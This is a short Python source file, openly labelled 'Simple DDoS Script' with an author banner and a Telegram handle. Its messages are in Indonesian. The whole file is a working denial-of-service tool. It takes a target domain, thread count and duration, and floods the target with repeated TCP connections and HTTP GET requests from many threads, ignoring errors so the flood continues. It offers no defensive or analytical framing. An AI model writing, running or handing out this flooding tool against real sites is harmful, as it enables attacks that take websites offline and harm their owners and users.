import socket
import threading
import time
import sys
import os 

banner_text = """


███████╗███╗░░░███╗██████╗░██╗░░██╗██╗░░░██╗
██╔════╝████╗░████║██╔══██╗██║░░██║╚██╗░██╔╝
█████╗░░██╔████╔██║██████╔╝███████║░╚████╔╝░
██╔══╝░░██║╚██╔╝██║██╔═══╝░██╔══██║░░╚██╔╝░░
███████╗██║░╚═╝░██║██║░░░░░██║░░██║░░░██║░░░
╚══════╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░

Simple DDoS Script by Shir0/Shinsegiru
Telegram: @Shinsegiru
Version: 1.0

"""

print(banner_text)
    
def attack(target, threads, duration):
    target_protocol = "http"
    if target.startswith("https"):
        target_protocol = "https"

    target = target.replace("https://", "").replace("http://", "")
    ip = socket.gethostbyname(target)
    port = 80 if target_protocol == "http" else 443

    print(f"Mulai serangan DDoS ke {target} ({ip}) untuk {duration} detik dengan {threads} thread.")
    
    start_time = time.time()

    def spam():
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.sendto(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode(), (ip, port))
                s.close()
            except:
                pass

    thread_list = []

    try:
        for _ in range(threads):
            thread = threading.Thread(target=spam)
            thread_list.append(thread)
            thread.start()

        while time.time() - start_time < duration:
            current_time = int(time.time() - start_time)
            print(f"\rDurasi serangan: {current_time}/{duration} detik", end="")
            time.sleep(1)

        print("\nSerangan selesai.")

    except KeyboardInterrupt:
        print("\nKeyboardInterrupt: Keluar dari script.")
        os._exit(0)
    finally:
        for thread in thread_list:
            thread.join()

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Penggunaan: python start.py <domain website contoh: https://domain.com> <jumlah thread. Nilai default 100> <waktu dalam detik>")
        sys.exit(1)

    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60

    attack(target, threads, duration)
